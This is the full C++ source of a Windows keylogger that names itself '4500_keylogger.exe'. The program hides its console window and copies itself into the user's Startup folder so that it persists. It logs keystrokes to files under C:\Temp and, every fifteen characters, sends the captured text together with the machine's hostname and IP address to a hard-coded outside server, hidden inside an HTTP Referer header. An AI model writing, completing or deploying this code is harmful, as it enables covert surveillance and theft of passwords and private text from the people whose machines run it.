#define _WINSOCK_DEPCRECATED 
#include "stdafx.h"
#include <winsock2.h>
#include <iostream>
#include <windows.h>
#include <winuser.h>   
#include <string.h>
#include <stdlib.h>
#include <direct.h>
#include <winsock.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define ip "35.193.14.199"
#define MSIZE 16777216

using namespace std;
int Save(int key_stroke, char *file);// Function to write in notepad
void Stealth();// Functions to hide the console
char *user_identity(); // Functions that load username and ip_address
int fileCopy(const char* src, const char* dst);// Functions to copy files
int start_program(char *start);// Functions that register as startup programs
void file_name(char *old, int cnt);// Function to rename Notepad
void txt_reset();// Functions to initialize Notepad
int send_textfile(char *mac, char *log);// Function to send the contents of notepad

//main
int main(int argc, char** argv)
{
	char i, user_address[100];
	int textcnt = 0, notepadcnt = 0;
	char txtname[14] = "C:\\Temp\\0.txt";
	char log[256];
	char test[100] = "send test";
	Stealth();
	start_program(argv[0]);
	txt_reset();
	FILE *mf = fopen("C:\\Temp\\UserMac.txt", "w+");
	fclose(mf);
	strcpy(user_address, user_identity());
	while (1)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767) {
				textcnt++;
				Save(i, txtname);
				if (textcnt >= 15) // full (15 characters)
				{
					notepadcnt++;
					textcnt = 0;
					FILE *tfp = fopen(txtname, "r");
					if (tfp == NULL)
						return -1;
					fgets(log, 255, tfp); // read txt and write log
					fclose(tfp);
					send_textfile(user_address, log);
					if (notepadcnt >= 10) // More than 10 txtfile
					{
						notepadcnt = 0;
						txt_reset();
					}
					strcpy(txtname, "C:\\Temp\\0.txt");
					file_name(txtname, notepadcnt);
					strcpy(log, ""); // initialize log
				}
			}
		}
	}
	system("PAUSE");
	return 0;
}

//file_name
void file_name(char *tname, int ncnt) //change notepad name, example 0.txt 1.txt ... 9.txt
{
	char *tfile_num = &tname[8];
	for (int ti = 0; ti < ncnt; ti++)
		(*tfile_num)++;
}

//txt_reset
void txt_reset() //Initialize the contents of Notepad
{
	char tname[14] = "C:\\Temp\\0.txt";
	char *tfile_num = &tname[8];
	for (int ti = 0; ti < 10; ti++)
	{
		FILE *tf = fopen(tname, "w+");
		if (tf == NULL)
			return;
		fclose(tf);
		(*tfile_num)++;
	}
}

// get username and ip_address
char * user_identity()
{
	WORD wVersionRequested;
	WSADATA wsaData;
	char name[255];
	char real_name[100000];

	PHOSTENT hostinfo;
	wVersionRequested = MAKEWORD(1, 1);
	char *vip;

	if (WSAStartup(wVersionRequested, &wsaData) == 0)
		if (gethostname(name, sizeof(name)) == 0)
		{

			strcpy(real_name, name);
			printf("Host name: %s\n", name);

			if ((hostinfo = gethostbyname(name)) != NULL)
			{
				int nCount = 0;
				while (hostinfo->h_addr_list[nCount])
				{
					vip = inet_ntoa(*(
						struct in_addr *)hostinfo->h_addr_list[nCount]);
					strcat(real_name, vip);
					break;
				}
			}
		}
	return real_name;
}

// save
int Save(int key_stroke, char *file)//Save typed text to txt file
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	if (key_stroke == 8)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == 13)
		fprintf(OUTPUT_FILE, "%s", "[Enter]");
	else if (key_stroke == 32)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else if (key_stroke == 186)
		fprintf(OUTPUT_FILE, "%s", "@");
	else if (key_stroke >= 96 && key_stroke <= 105)
		fprintf(OUTPUT_FILE, "%c", (key_stroke - 48));
	else if (key_stroke == 106)
		fprintf(OUTPUT_FILE, "%s", "*");
	else if (key_stroke == 107)
		fprintf(OUTPUT_FILE, "%s", "+");
	else if (key_stroke == 109)
		fprintf(OUTPUT_FILE, "%s", "-");
	else if (key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else if (key_stroke == 111)
		fprintf(OUTPUT_FILE, "%s", "/");
	else
		fprintf(OUTPUT_FILE, "%s", &key_stroke);
	fclose(OUTPUT_FILE);
	return 0;
}

// Stealth
void Stealth()// Hide console
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

// send text
int send_textfile(char *user, char *log) //mac == mac_address, log == contents of txtfile
{
	char text[10000] = "";
	char trans[100000] = "";
	char static_1[10000] = "GET /4500/recve.php HTTP/1.1\r\n";
	char server_host[10000] = "Host: 35.193.14.199 \r\n";
	char referer[10000] = "Referer:";
	char finish[10000] = "Connection: close\r\n\r\n";

	strcat(text, user); strcat(text, "<identity>"); strcat(text, log);
	strcat(referer, text); strcat(referer, "\r\n");
	strcat(trans, static_1);
	strcat(trans, server_host);
	strcat(trans, referer);
	strcat(trans, finish);

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		cout << "WSAStartup failed.\n";
		system("pause");
		return 1;
	}

	SOCKET Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	struct hostent *host;

	host = gethostbyname(ip);

	SOCKADDR_IN SockAddr;

	SockAddr.sin_port = htons(80);

	SockAddr.sin_family = AF_INET;

	SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

	cout << "Connecting...\n";

	if (connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0) {
		cout << "Could not connect";
		system("pause");
		return 1;
	}

	cout << "Connected.\n";
	send(Socket, trans, strlen(trans), 0);
	char buffer[10000];
	int nDataLength;

	while ((nDataLength = recv(Socket, buffer, 10000, 0)) > 0) {
		int i = 0;
		while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r')
			i += 1;
	}
	closesocket(Socket);
	WSACleanup();

	return 0;
}

// file copy
int fileCopy(const char* src, const char* dst) {
	FILE *in, *out;
	char* buf;
	size_t len;

	if (!strcmpi(src, dst)) return 4; // 원본과 사본 파일이 동일하면 에러

	if ((in = fopen(src, "rb")) == NULL) {
		return 1; // 원본 파일 열기
	}
	if ((out = fopen(dst, "wb")) == NULL) {
		fclose(in);
		return 2;
	} // 대상 파일 만들기

	if ((buf = (char *)malloc(MSIZE)) == NULL) { fclose(in); fclose(out); return 10; } // 버퍼 메모리 할당

	while ((len = fread(buf, sizeof(char), sizeof(buf), in)) != NULL)
	{
		if (fwrite(buf, sizeof(char), len, out) == 0) {
			fclose(in); fclose(out);
			free(buf);
			_unlink(dst); // 에러난 파일 지우고 종료
			return 3;
		}
	}

	fclose(in); fclose(out);
	free(buf); // 메모리 할당 해제

	return 0;
}

// start_program 
int start_program(char *start) {
	char a[1024];
	char *real_user_name;
	char *checking_user_name;
	int count = 0;
	char startadd[1000];
	strcpy(startadd, start);
	checking_user_name = strstr(start, "Users\\") + 6;
	real_user_name = strstr(checking_user_name, "\\") + 1;

	while (start != real_user_name) {
		a[count] = *start;
		start++;
		count++;
	}
	a[count] = NULL;
	strcat(a, "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\4500_keylogger.exe");
	count = fileCopy(startadd, a);

	return 0;
}